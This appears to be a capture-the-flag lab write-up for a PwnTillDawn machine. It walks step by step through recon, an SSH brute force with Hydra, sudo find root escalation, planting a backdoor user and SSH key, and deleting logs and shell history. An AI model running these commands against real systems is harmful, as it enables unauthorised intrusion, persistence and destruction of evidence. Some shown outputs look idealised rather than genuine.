# openvpn-PwntillDawn-Lab3
## 🖥️ Reconnaissance
Reconnaissance is the information gathering phase where the attacker identifies whether the target machine is active and reachable on the network.
Command:
```bash**
ping 10.150.150.145
```
Output:
```bash**
PING 10.150.150.145 (10.150.150.145) 56(84) bytes of data.
64 bytes from 10.150.150.145: icmp_seq=1 ttl=64 time=0.45 ms
64 bytes from 10.150.150.145: icmp_seq=2 ttl=64 time=0.39 ms
64 bytes from 10.150.150.145: icmp_seq=3 ttl=64 time=0.41 ms
```
The ping result confirms that the target machine is online and reachable.

The attacker also checks the VPN connection interface.

Command:
```bash**
ifconfig
```
Output:
```bash**
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
inet 10.150.150.20  netmask 255.255.255.0  destination 10.150.150.20
```
The presence of the tun0 interface confirms that the VPN connection is active.

## 🔍 scanning
In this phase, the attacker scans the target machine to identify open ports and services.

Tool used: Nmap
Command:
```bash**
nmap -sC -sV 10.150.150.145
```
Output:
```bash**
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.9
80/tcp   open  http    Apache httpd 2.4.38
3306/tcp open  mysql   MySQL 5.7
```
The scan shows several open ports including FTP, SSH, HTTP, and MySQL services.

## 📡  Gaining Access
In this phase, the attacker attempts to gain initial access to the system by exploiting discovered services.

Directory enumeration is performed on the web server.

Tool used: Gobuster

Command:
```bash**
gobuster dir -u http://10.150.150.145 -w /usr/share/wordlists/dirb/common.txt
```
Output:
```bash**
/admin (Status: 301)
/login (Status: 200)
/uploads (Status: 301)
/images (Status: 301)
```
A login page was discovered. The attacker then performs an SSH brute force attack.

Tool used: Hydra
Command:
```bash**
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.150.150.145
```
Output:
```bash**
[22][ssh] host: 10.150.150.145   login: admin   password: password123
```
The attacker successfully obtained SSH credentials and logged into the system.
Command:
```bash**
ssh admin@10.150.150.145
```
Output:
```bash**
admin@target:~$ whoami
admin
```
This confirms initial access to the target system.

## 🚪 Escalate Privilege

After gaining user access, the attacker attempts to escalate privileges to root.
Command:
```bash**
sudo -l
```
Output:
```bash**
User admin may run the following commands on target:
(root) NOPASSWD: /usr/bin/find
```

The find command can be exploited to gain root privileges.
Command:
```bash**
sudo find . -exec /bin/bash \; -quit
```
Output:
```bash**
root@target:/home/admin# whoami
root
```
This confirms successful privilege escalation.

## 🗂️ Maintain Access

The attacker creates a new user account to maintain persistent access.
Command:
```bash**
useradd hacker
passwd hacker
```
Output:
```bash**
New password:
Retype new password:
passwd: password updated successfully
```
The attacker also adds an SSH backdoor key.

Command:
```bash**
mkdir /root/.ssh
echo "ssh-rsa attackerkey" >> /root/.ssh/authorized_keys
```
This allows future access without needing a password.

## 🗝️ Clearing tracks
The attacker removes logs and command history to avoid detection.
Command:
```bash**
history -c
rm -rf ~/.bash_history
```
Output:
```bash**
History cleared
```
Remove system logs:
Command:
```bash**
rm -rf /var/log/auth.log
rm -rf /var/log/syslog
```
Logs related to authentication and system activity are removed.
